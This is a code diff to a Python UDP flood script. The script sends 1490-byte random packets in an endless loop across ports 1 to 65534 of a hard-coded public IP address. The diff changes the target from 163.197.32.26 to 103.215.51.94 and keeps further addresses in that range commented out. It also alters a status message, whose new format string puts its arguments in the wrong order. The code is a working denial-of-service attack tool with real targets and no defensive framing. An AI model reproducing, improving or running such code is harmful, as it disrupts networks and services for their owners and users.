@@ -27,6 +27,12 @@ os.system(cmd_clear)
 sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
+
+# Port selection.
+port_mode = False # If 'False' all ports will be use, if 'True' - certain.
+port = 1
+
+
 # Starting working.
 os.system(cmd_clear)
 print('\033[1;34mTo all of my children in whom Life flows abundant...')
@@ -62,27 +68,26 @@ time.sleep(1)
 print('\033[1;36m/ac Groundwork')
 time.sleep(1)
 
-# Port selection.
-port_mode = False # If 'False' all ports will be use, if 'True' - certain.
-port = 1
-
-#ip = (str("103.215.51.90"))
-#ip = (str("103.215.51.91"))
-#ip = (str("103.215.51.92"))
-#ip = (str("103.215.51.93"))
-ip = (str("163.197.32.26"))
-
 sent = 0
 i = 590
 timeR = i + random.randint(0,20)
 now = datetime.datetime.now()
 dtime = now.strftime("%Y-%m-%d %H:%M:%S")
 
+#ip = "103.215.51.90"
+#ip = "103.215.51.91"
+#ip = "103.215.51.92"
+#ip = "103.215.51.93"
+ip = "103.215.51.94"
+
+
+
 if port_mode == False:  # All ports.
     try:
         while True:
             if port == 65534:
-                print('\033[32;1m[%s]Sented %s packets to (str("163.197.32.26")) through port:1~%s\033[0m'%(dtime, sent, port))
+                
+                print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, ip, sent, port))
                 print('\033[1;36m/wait %s'%(timeR))
                 port = 1
                 time.sleep(timeR)
@@ -91,7 +96,10 @@ if port_mode == False:  # All ports.
             elif port == 1900:
                 port = 1901
 
-            sock.sendto(bytes, (str("163.197.32.26")), port)
+            #sock.sendto(bytes, (str("103.215.51.90"), port))
+            sock.sendto(bytes, (str(ip), port))
+            #sock.sendto(bytes, (str("103.215.51.92"), port))
+            #sock.sendto(bytes, (str("103.215.51.93"), port))
             sent += 1
             port += 1
             timeR = i + random.randint(0,20)
@@ -102,4 +110,3 @@ if port_mode == False:  # All ports.
             
     except:
         print('\n\033[31;1mExited\033[0m')
-
